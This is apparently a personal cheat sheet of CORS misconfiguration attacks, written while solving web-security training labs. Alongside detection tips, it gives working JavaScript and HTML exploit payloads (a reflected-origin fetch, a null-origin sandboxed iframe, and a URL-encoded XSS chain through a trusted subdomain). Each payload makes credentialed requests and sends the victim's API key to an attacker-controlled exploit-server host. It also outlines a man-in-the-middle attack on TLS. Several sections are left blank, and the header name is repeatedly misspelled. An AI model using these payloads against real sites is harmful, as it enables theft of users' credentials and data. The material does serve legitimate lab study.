# CORS

## Types:

1. Server-generated ACAO header from client-specified Origin header
2. Errors parsing Origin headers
3. Whitelisted null origin value
4. Exploiting XSS via CORS trust relationships
5. Breaking TLS with poorly configured CORS
6. Intranets and CORS without credentials 
---

## How to find each type:

1. Server-generated ACAO header from client-specified Origin header
- Attempt to use a random origin in the `Origin` header.
- See if the origin is reflected in the  `Access-Allow-Control-Origin` header.
2. Errors parsing Origin headers
- See if you can use subdomains or domains that end with the whitelisted domain.
3. Whitelisted null origin value
- Put `null` in the origin header and see if it is reflected.
4. Exploiting XSS via CORS trust relationships
- Check to see if subdomains are allowed in the `Access-Allow-Control-Origin` header.
- If they are, see if there is XSS on these domains.
5. Breaking TLS with poorly configured CORS
-
6. Intranets and CORS without credentials 
-
---

## How to exploit each type:

1. Server-generated ACAO header from client-specified Origin header
```js
<script>
  function getadmin() {
      var res = JSON.parse(this.response)
      fetch("https://exploit-0ac9009003aa0ee18189ec3601fa001a.exploit-server.net/accountdetails?" + res.apikey);
  }
  
  const request = new XMLHttpRequest();
  request.addEventListener("load", getadmin);
  request.open("GET", "https://0a13001d03130e4c81a6ed270097004e.web-security-academy.net/accountdetails", true);
  request.withCredentials = true;
  request.send();
</script>
```
2. Errors parsing Origin headers
- If `normal-website.com` is ok then try `hackersnormal-website.com`.
3. Whitelisted null origin value
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a13001d03130e4c81a6ed270097004e.web-security-academy.net/accountdetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
var res = JSON.parse(this.response)
location = 'https://exploit-0ac9009003aa0ee18189ec3601fa001a.exploit-server.net/accountdetails?' + res.apikey;
};
</script>"></iframe>
```
4. Exploiting XSS via CORS trust relationships
- Use XSS with the first CORS exploit:
  ```html
  <script>
    location="http://subdomain/?param=<%3Cscript%3Evar+req+%3D+new+XMLHttpRequest%28%29%3B+req.onload+%3D+reqListener%3B+req.open%28%27get%27%2C%27https%3A%2F%2F0a7f000b04d942c38151111c002900a6.web-security-academy.net%2FaccountDetails%27%2Ctrue%29%3B+req.withCredentials+%3D+true%3Breq.send%28%29%3Bfunction+reqListener%28%29+%7Bvar+res+%3D+JSON.parse%28this.response%29%3B+location%3D%27https%3A%2F%2Fexploit-0a350083041a4269817d1092013b00eb.exploit-server.net%2FaccountDetails%3Fkey%3D%27%2Bres.apikey%3B%7D%3B%3C%2Fscript%3E"
  </script>

  hackvertor to urlencode
  <@urlencode><script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a7f000b04d942c38151111c002900a6.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {var res = JSON.parse(this.response); location='https://exploit-0a350083041a4269817d1092013b00eb.exploit-server.net/accountDetails?key='+res.apikey;};</script><@/urlencode>
  
  Result:
  %3Cscript%3Evar+req+%3D+new+XMLHttpRequest%28%29%3B+req.onload+%3D+reqListener%3B+req.open%28%27get%27%2C%27https%3A%2F%2F0a7f000b04d942c38151111c002900a6.web-security-academy.net%2FaccountDetails%27%2Ctrue%29%3B+req.withCredentials+%3D+true%3Breq.send%28%29%3Bfunction+reqListener%28%29+%7Bvar+res+%3D+JSON.parse%28this.response%29%3B+location%3D%27https%3A%2F%2Fexploit-0a350083041a4269817d1092013b00eb.exploit-server.net%2FaccountDetails%3Fkey%3D%27%2Bres.apikey%3B%7D%3B%3C%2Fscript%3E
  ```
5. Breaking TLS with poorly configured CORS
- This attack involves the following steps:
  - The victim user makes any plain HTTP request.
  - The attacker injects a redirection to: `http://trusted-subdomain.vulnerable-website.com`
  - The victim's browser follows the redirect.
  - The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to: `https://vulnerable-website.com`
  - The victim's browser makes the CORS request, including the origin: `http://trusted-subdomain.vulnerable-website.com`
  - The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
  - The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
6. Intranets and CORS without credentials 
-
---

## Other important notes:
- Look for the `Access-Allow-Control-Origin` header.
